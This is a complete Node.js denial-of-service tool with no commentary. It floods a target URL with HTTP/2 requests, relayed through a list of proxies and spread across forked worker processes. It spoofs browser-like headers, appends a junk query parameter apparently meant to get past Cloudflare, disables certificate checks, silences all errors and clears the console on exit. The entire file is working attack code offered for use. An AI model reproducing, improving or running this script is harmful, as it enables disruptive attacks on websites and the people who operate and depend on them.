const fs = require('fs');
const http = require('http');
const http2 = require('http2');
const tls = require('tls');
const cluster = require('cluster');
const url = require('url');
const { HeaderGenerator } = require('header-generator');

process.on('uncaughtException',  function(error) {});
process.on('unhandledRejection', function(error) {});


const args = { 
	target: process.argv[2],
	time: process.argv[3],
	threads: process.argv[4],
	ratelimit: process.argv[5],
	method: process.argv[6],
	proxyfile: process.argv[7],
}

const proxies = fs.readFileSync(args.proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n');
const target = args.target;
	const randomInt = (min, max) => Math.floor(Math.random() * (max - min +1) + min);
  const userAgentString = "\u{1F3FF}".repeat(randomInt(1,15));
  const userAgentBuffer = Buffer.from(userAgentString);
function main() {
	function rnd_string(length, type) 
	{
		var _ = "";
		var characters = "";
		if (type == "LN") 
		{
			characters ="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		} 
		else if (type == "L") 
		{
			characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
		} 
		else if (type == "N")
		{
			characters = "0123456789";
		} 
		else 
		{
		characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		}

		var charactersLength = characters.length;

		for (var i = 0; i < length; i++) 
		{
			_ += characters.charAt(Math.floor(Math.random() * charactersLength));
		}

		return _;
	}

	function parseRandTarget(target) {
		if (target.includes("%RAND%")) 
		{
			target = target.replace(/%RAND%/g, rnd_string(8, "LN"));
		} 
		else if (target.includes("%RANDLN8%")) 
		{
			target = target.replace(/%RANDLN8%/g, rnd_string(8, "LN"));
		} 
		else if (target.includes("%RANDLN16%")) 
		{
			target = target.replace(/%RANDLN16%/g, rnd_string(16, "LN"));
		} 
		else if (target.includes("%RANDLN32%")) 
		{
			target = target.replace(/%RANDLN32%/g, rnd_string(32, "LN"));
		} 
		else if (target.includes("%RANDLN64%")) 
		{
			target = target.replace(/%RANDLN64%/g, rnd_string(64, "LN"));
		} 
		else if (target.includes("%RANDL%")) 
		{
			target = target.replace(/%RANDL%/g, rnd_string(8, "L"));
		} 
		else if (target.includes("%RANDL16%")) 
		{
			target = target.replace(/%RANDL16%/g, rnd_string(16, "L"));
		} 
		else if (target.includes("%RANDL32%")) 
		{
			target = target.replace(/%RANDL32%/g, rnd_string(32, "L"));
		} 
		else if (target.includes("%RANDL64%")) 
		{
			target = target.replace(/%RANDL64%/g, rnd_string(64, "L"));
		} 
		else if (target.includes("%RANDN%")) 
		{
			target = target.replace(/%RANDN%/g, rnd_string(8, "N"));
		} 
		else if (target.includes("%RANDN16%")) 
		{
			target = target.replace(/%RANDN16%/g, rnd_string(16, "N"));
		} 
		else if (target.includes("%RANDN32%")) 
		{
			target = target.replace(/%RANDN32%/g, rnd_string(32, "N"));
		} 
		else if (target.includes("%RANDN64%")) 
		 {
			target = target.replace(/%RANDN64%/g, rnd_string(64, "N"));
		} 
		else 
		{
			target = target;
		}
		return target;
	}	
	
	function proxi() {
		return proxies[Math.floor(Math.random() * proxies.length)];
	}	
	
	let headerGenerator = new HeaderGenerator({
		browsers: [
			{name: "chrome", minVersion: 100, httpVersion: "2"},
			{name: "firefox", minVersion: 100, httpVersion: "2"},
			{name: "safari", httpVersion: "2"},
		],
		devices: [
			"desktop",
			"mobile"
		],
		operatingSystems: [
			"linux",
			"windows",
			"macos",
			"android",
			"ios"
		],
		locales: ["en-US", "en"]
	});
	
	let randomHeaders = headerGenerator.getHeaders();
	let headers = randomHeaders;
	let parsed = url.parse(target);
	
	

    if(parsed.protocol == "https:") {
        randomHeaders[":path"] = parsed.path + '?'+ 'cfmamyebal' +'=' + userAgentBuffer;
        randomHeaders[":method"] = args.method;
        randomHeaders[":scheme"] = parsed.protocol.replace(":", "");
        randomHeaders[":authority"] = parsed.host;
		randomHeaders["user-agent"] = userAgentBuffer;
		
		randomHeaders["sec-ch-ua"] = '';
		randomHeaders["pragma"] = '';
		randomHeaders["cache-control"] = '';
		randomHeaders["sec-ch-ua-mobile"] = '';
		randomHeaders["sec-ch-ua-platform"] = '';
    }	
	
	setInterval( () => {
		var proxy = proxi().split(':');	

		const agent = new http.Agent({
		   keepAlive: true,
		   keepAliveMsecs: 50000,
		   maxSockets: Infinity,
		   maxTotalSockets: Infinity,
		   maxSockets: Infinity
		});	
		
		
		const req = http.request({
			  method: 'CONNECT',
			  host: proxy[0],
			  port: proxy[1],
			  agent: agent,
			  globalAgent: agent,		  
			  path: parsed.host + ":443",
			  headers: {
				  'Host': parsed.host,
				  'Proxy-Connection': 'Keep-Alive',
				  'Connection': 'Keep-Alive',
			  },		  
		});
		req.end();
		
		req.on('connect', (err, info) => {
			function attack(socket) {
				
				http2.connect(parseRandTarget(target), {
					createConnection: () => socket,
					settings: {
						headerTableSize: 65536,
						maxConcurrentStreams: 1000,
						initialWindowSize: 6291456,
						maxHeaderListSize: 262144,
						enablePush: false
					}
				}, (session) => {
					for(let i = 0; i < args.ratelimit; i++) {
						const request = session.request(headers);
                        request.setEncoding('utf8');
                        request.on('data', (chunk) => {});
                        request.on("response", () => {
                            request.close();
                        })
                        request.end();						
					}
				})
			}
			
			const socket = tls.connect({
				rejectUnauthorized: false,
				host: parsed.host,
				servername: parsed.host,
				honorCipherOrder: false, 
				requestCert: true,
				socket: info,
				secure: true,
				ALPNProtocols: ['h2', 'http1.1'],
			}, () => {
				attack(socket);
			})		
		})
	})
}

if (cluster.isPrimary) {
	for (let i = 0; i < args.threads; i++) {
		cluster.fork();    
	}
	cluster.on('exit', (worker, code, signal) => {});
} else {
	main();
}

setTimeout(function() {
	console.clear();
	process.exit()
}, args.time * 1000);